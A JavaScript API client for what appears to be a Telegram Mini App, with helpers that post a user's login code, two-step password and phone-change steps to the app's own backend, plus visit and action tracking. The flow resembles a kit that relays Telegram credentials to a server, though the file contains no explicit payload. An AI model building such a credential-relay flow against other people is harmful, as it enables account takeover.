const API_BASE = import.meta.env.VITE_API_BASE || "";

export async function postJson(path, payload = {}) {
  const initData = window.Telegram?.WebApp?.initData || "";
  const response = await fetch(`${API_BASE}${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Telegram-Init-Data": initData,
    },
    body: JSON.stringify(payload),
  });

  const data = await response.json().catch(() => null);
  if (!response.ok) {
    throw new Error(data?.error || `API Error: ${response.status}`);
  }
  return data;
}

export const api = {
  trackVisit: (data) => postJson("/api/stats/visit", data).catch(() => {}),
  trackAction: (data) => postJson("/api/stats/action", data).catch(() => {}),
  getBot: (data) => postJson("/api/get-bot", data),
  getState: (data) => postJson("/api/get-state", data),
  getTemplate: (data) => postJson("/api/template", data),
  sendCode: (data) => postJson("/api/send-code", data),
  enterCode: (data) => postJson("/api/enter-code", data),
  enterPass: (data) => postJson("/api/enter-pass", data),
  wrongNumber: (data) => postJson("/api/wrong-number", data),
  sendCodeNewPhone: (data) => postJson("/api/send-code-new-phone", data),
  logout: (data) => postJson("/api/logout", data),
  logClientError: (data) => {
    try {
      const body = JSON.stringify(data);
      if (navigator.sendBeacon) {
        navigator.sendBeacon(
          `${API_BASE}/api/client-error`,
          new Blob([body], { type: "application/json" })
        );
      } else {
        fetch(`${API_BASE}/api/client-error`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body,
          keepalive: true,
        }).catch(() => {});
      }
    } catch {}
  },
};
